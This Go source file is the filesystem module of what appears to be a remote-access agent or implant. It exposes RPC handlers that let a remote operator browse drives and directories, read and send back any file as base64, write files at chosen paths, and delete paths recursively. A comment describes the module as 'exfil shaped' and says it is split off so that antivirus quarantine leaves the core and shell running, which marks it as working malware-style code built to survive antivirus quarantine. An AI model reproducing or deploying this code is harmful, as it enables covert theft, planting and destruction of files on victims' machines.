//go:build !modular || mod_fs

package main

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"os"
	"path/filepath"
	"runtime"

	"github.com/fakecrowd/sys0/internal/rpc"
	"github.com/fakecrowd/sys0/internal/wire"
)

// FS MODULE — filesystem browse + transfer (ls/stat/get/put/rm). High AV signal
// (file write/exfil shaped); isolated so quarantine here leaves core/shell up.

func init() {
	registerMethod(wire.MethodFsLs, func(a *Agent, _ context.Context, params json.RawMessage) (any, *rpc.Error) {
		return a.doFsLs(params)
	})
	registerMethod(wire.MethodFsStat, func(a *Agent, _ context.Context, params json.RawMessage) (any, *rpc.Error) {
		return a.doFsStat(params)
	})
	registerMethod(wire.MethodFsGet, func(a *Agent, _ context.Context, params json.RawMessage) (any, *rpc.Error) {
		return a.doFsGet(params)
	})
	registerMethod(wire.MethodFsPut, func(a *Agent, _ context.Context, params json.RawMessage) (any, *rpc.Error) {
		return a.doFsPut(params)
	})
	registerMethod(wire.MethodFsRm, func(a *Agent, _ context.Context, params json.RawMessage) (any, *rpc.Error) {
		return a.doFsRm(params)
	})
}

func (a *Agent) doFsLs(params json.RawMessage) (any, *rpc.Error) {
	var p wire.FsLsParams
	if e := decode(params, &p); e != nil {
		return nil, e
	}
	// Windows has no single filesystem root: at the "drive list" level (empty
	// path, or "/" / "\\") enumerate the available drive letters as dirs so the
	// console file browser can offer C:\ D:\ etc.
	if runtime.GOOS == "windows" && (p.Path == "" || p.Path == "/" || p.Path == "\\") {
		res := wire.FsLsResult{Path: "", Entries: []wire.FsEntry{}}
		for c := 'A'; c <= 'Z'; c++ {
			root := string(c) + ":\\"
			if _, err := os.Stat(root); err == nil {
				res.Entries = append(res.Entries, wire.FsEntry{
					Name: root, Mode: "drive", IsDir: true,
				})
			}
		}
		return res, nil
	}
	entries, err := os.ReadDir(p.Path)
	if err != nil {
		return nil, rpc.Errorf(rpc.CodeInternal, "%v", err)
	}
	res := wire.FsLsResult{Path: p.Path, Entries: []wire.FsEntry{}}
	for _, e := range entries {
		info, err := e.Info()
		if err != nil {
			continue
		}
		res.Entries = append(res.Entries, wire.FsEntry{
			Name: e.Name(), Size: info.Size(), Mode: info.Mode().String(),
			IsDir: e.IsDir(), MTime: info.ModTime().Unix(),
		})
	}
	return res, nil
}

func (a *Agent) doFsStat(params json.RawMessage) (any, *rpc.Error) {
	var p wire.FsLsParams
	if e := decode(params, &p); e != nil {
		return nil, e
	}
	info, err := os.Stat(p.Path)
	if err != nil {
		return nil, rpc.Errorf(rpc.CodeInternal, "%v", err)
	}
	return wire.FsStatResult{
		Path: p.Path, Size: info.Size(), Mode: info.Mode().String(),
		IsDir: info.IsDir(), MTime: info.ModTime().Unix(),
	}, nil
}

func (a *Agent) doFsGet(params json.RawMessage) (any, *rpc.Error) {
	var p wire.FsGetParams
	if e := decode(params, &p); e != nil {
		return nil, e
	}
	b, err := os.ReadFile(p.Path)
	if err != nil {
		return nil, rpc.Errorf(rpc.CodeInternal, "%v", err)
	}
	return wire.FsGetResult{Path: p.Path, Size: int64(len(b)), Data: base64.StdEncoding.EncodeToString(b)}, nil
}

func (a *Agent) doFsPut(params json.RawMessage) (any, *rpc.Error) {
	var p wire.FsPutParams
	if e := decode(params, &p); e != nil {
		return nil, e
	}
	b, err := base64.StdEncoding.DecodeString(p.Data)
	if err != nil {
		return nil, rpc.Errorf(rpc.CodeBadParams, "bad base64: %v", err)
	}
	mode := os.FileMode(0o644)
	if p.Mode != 0 {
		mode = os.FileMode(p.Mode)
	}
	if dir := filepath.Dir(p.Path); dir != "" {
		_ = os.MkdirAll(dir, 0o755)
	}
	// Chunked-friendly write: the first chunk (offset 0) creates/truncates the
	// file; later chunks open it without truncating and WriteAt their offset.
	flags := os.O_CREATE | os.O_WRONLY
	if p.Offset == 0 {
		flags |= os.O_TRUNC
	}
	f, err := os.OpenFile(p.Path, flags, mode)
	if err != nil {
		return nil, rpc.Errorf(rpc.CodeInternal, "%v", err)
	}
	defer f.Close()
	if _, err := f.WriteAt(b, p.Offset); err != nil {
		return nil, rpc.Errorf(rpc.CodeInternal, "%v", err)
	}
	var size int64
	if st, serr := f.Stat(); serr == nil {
		size = st.Size()
	}
	return wire.FsPutResult{OK: true, Path: p.Path, Written: len(b), Size: size}, nil
}

func (a *Agent) doFsRm(params json.RawMessage) (any, *rpc.Error) {
	var p wire.FsRmParams
	if e := decode(params, &p); e != nil {
		return nil, e
	}
	var err error
	if p.Recursive {
		err = os.RemoveAll(p.Path)
	} else {
		err = os.Remove(p.Path)
	}
	if err != nil {
		return nil, rpc.Errorf(rpc.CodeInternal, "%v", err)
	}
	return wire.OKResult{OK: true}, nil
}
